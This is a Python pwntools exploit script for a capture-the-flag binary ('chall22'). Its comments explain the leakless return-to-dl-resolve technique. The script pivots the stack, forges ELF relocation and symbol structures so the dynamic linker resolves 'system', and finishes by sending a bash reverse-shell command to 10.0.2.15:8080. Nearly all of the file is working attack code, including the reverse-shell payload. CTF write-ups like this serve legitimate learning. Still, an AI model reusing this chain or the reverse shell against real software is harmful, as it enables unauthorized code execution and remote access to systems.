from pwn import *

# return-to-dl-resolve leakless exploit
# by Peace-Maker

# I didn't know of this technique and wasn't able to solve this challenge during the race.
# Without being able to leak any data, we can't calculate the address of some interesting function
# like `execve` or `system` in libc. Turns out we don't have to, because the purpose
# of the dynamic linker is exactly that and we can kindly ask it to resolve `system` for us.

# This exploit crafts fake structures for the dynamic loader and trick it to 
# load `system` even though that function isn't in the imports of the challenge binary.

# Used references
# http://phrack.org/issues/58/4.html#article "Advanced return-into-lib(c) exploits (PaX case study)"
# https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62 Writeup for 0ctf babystack with return-to dl-resolve
# http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-vi.html

r = process('./run.sh')
# r = process('./chall22')
# r = remote('challenge.pwny.racing', 40022)
e = context.binary = ELF('./chall22')

# gdb.attach(r, gdbscript='''
# b system
# ''')
# b *0x08048440
# b *0x08048462

# Some writeable known address where we put our fake structures.
known_data_base = 0x0804A800

# Gadgets
popal = 0x08048462 # popal ; cld ; ret
read_call_in_play = 0x08048437

# Step 1. Read to a larger buffer for a larger payload,
#         because the initial `read` in `play` is only 48 bytes
#         and we need more space.
rop = flat([read_call_in_play, 0, known_data_base, 0x200])

# Put the address of our buffer as the saved_ebp, so `leave; ret` at 
# the end of `play` reads the return address from our known buffer address,
# thus continue running our 2nd stage rop chain.
payload = cyclic(24) + p32(known_data_base-4) + rop
r.send(payload)

# Step 2. Send ret2ld payload
# readelf -d chall22
# or
# objdump -x chall22
# Get ELF section addresses used by dl-resolve.
# They all are tables/arrays of structures of different size.
SYMTAB = 0x80481cc # (Elf32_Sym *)
STRTAB = 0x804821c # (char *)
JMPREL = 0x8048298 # (Elf32_Rel *)
dl_resolver = 0x080482d0

# Offset inside data section where the actual string
# argument data for `system` will be. The payload
# is padded up until this offset oversized offset,
# so I don't have to worry about precalculating sizes too much.
SYSTEM_PARAMS_OFFSET = 80

"""
ref. phrack article section 5.1:

typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
/* How to extract and insert information held in the r_info field.  */
#define ELF32_R_SYM(val)                ((val) >> 8)
#define ELF32_R_TYPE(val)               ((val) & 0xff)


typedef struct
{
  Elf32_Word    st_name;   /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;  /* Symbol value */
  Elf32_Word    st_size;   /* Symbol size */
  unsigned char st_info;   /* Symbol type and binding */
  unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
  Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;
The fields st_size, st_info and st_shndx are not used during symbol
resolution.
"""

# Craft the above structures with offsets, such that they point into our payload.
# The argument to dl-resolve is an index into the JMPREL table.
# Put a value there to point at the fake Elf32_Rel structure in our payload below.
# 0x10 bytes = dl-resolve address + this rel_offset argument + ignored ret_addr of system + system's argument

# Elf32_Rel * reloc = JMPREL + reloc_offset;
rel_offset = known_data_base + 0x10 - JMPREL
# The address of our fake Elf32_Sym structure.
# Same offset as above + skipping the Elf32_Rel structure (8 bytes).
elf32_sym_addr = known_data_base + 0x18

# Calculate the correctly aligned index into the SYMTAB table (0x10 bytes element size).
# Elf32_Sym * sym = &SYMTAB[ ELF32_R_SYM (reloc->r_info) ];
elf32_sym_offs = elf32_sym_addr - SYMTAB
alignment = align(0x10, elf32_sym_offs) - elf32_sym_offs
elf32_sym_addr += alignment
elf32_sym_offs += alignment
index_sym = elf32_sym_offs // 0x10

# Pack the info into Elf32_Rel.r_info with a type of R_386_JMP_SLOT
# due to a sanity check in `fixup`
# https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=elf/dl-runtime.c;h=9ce488b673fef04baa40d5e7a295a6c490d4adc6;hb=5b4f7382af46b4187a958e40fb3123ac3ce16810#l80
# assert (ELF32_R_TYPE(reloc->r_info) == R_386_JMP_SLOT);
r_info = (index_sym << 8) | 0x07

# Our fake Elf32_Rel structure. Fill r_offset with a writeable address
# where the resolved address of `system` will be written to.
# We overwrite the address of `read` in the .got with `system`, just because.
elf32_rel = flat([e.got.read, r_info]) # Elf32_Rel struct

# The index of our fake STRTAB entry, so that dl-resolve calculates the
# address of "system" in this payload.
st_name = elf32_sym_addr + 0x10 - STRTAB # string after Elf32_Sym struct (size 0x10)

# Our fake Elf32_Sym structure. The st_info, st_other and st_shndx value is copied from the
# present Elf32_Sym structure of `read`.
elf32_sym_struct = flat([st_name, 0, 0, 0x12])

# Putting it all in place.
rop2 = flat([
    dl_resolver, # +0x00: call dynamic linker resolve routine
    rel_offset,  # +0x04: JMPREL + rel_offset = Elf32_Rel struct
    b'A'*4,   # +0x08: return address from system...
    known_data_base + SYSTEM_PARAMS_OFFSET,   # +0x0c system parameter
    elf32_rel,   # +0x10: Elf32_Rel struct pointing to Elf32_Sym struct at +0x18 + align
    b'B'*alignment, # +0x18: alignment for Elf32_Sym struct to 0x10.
    elf32_sym_struct, # +0x18+a: Elf32_Sym with "system" as name offset
    b'system\x00'
])

# Padding up until our command.
rop2 = rop2.ljust(SYSTEM_PARAMS_OFFSET, b'C')
# Try a reverse shell.
rop2 += b'bash -c "bash -i >& /dev/tcp/10.0.2.15/8080 0>&1"\x00'
# rop2 += b'bash -c "touch wat"\x00'
# rop2 += b'./flag_submitter peace-maker\x00'
r.send(rop2)

r.interactive()
